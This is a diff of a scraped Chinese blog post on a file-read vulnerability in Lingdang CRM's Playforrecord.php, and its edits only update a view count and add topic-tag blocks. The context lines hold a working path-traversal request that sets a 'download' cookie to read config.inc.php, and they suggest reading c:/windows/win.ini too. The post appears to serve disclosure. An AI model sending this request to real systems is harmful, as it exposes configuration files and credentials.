@@ -7,9 +7,17 @@ asset_dir: assets/灵当crm-playforrecord.php-文件读取漏洞
 # 灵当CRM Playforrecord.php 文件读取漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/5/23 08:30
-- 1310浏览
+- 1312浏览
 - [0评论](#comment)
 - 16分钟阅读
+
+深入探索
+
+软件开发
+
+CRM
+
+开发
 
 ---
 
@@ -67,6 +75,14 @@ GET /crm/modules/Accounts/Playforrecord.php HTTP/1.1
 Host: 51mis.mrxn.net
 Cookie: download=../../config.inc.php
 ```
+
+深入探索
+
+防火墙软件
+
+技术文章订阅
+
+安全
 
 或者 读取系统其他位置文件，如 `c:/windows/win.ini`
 
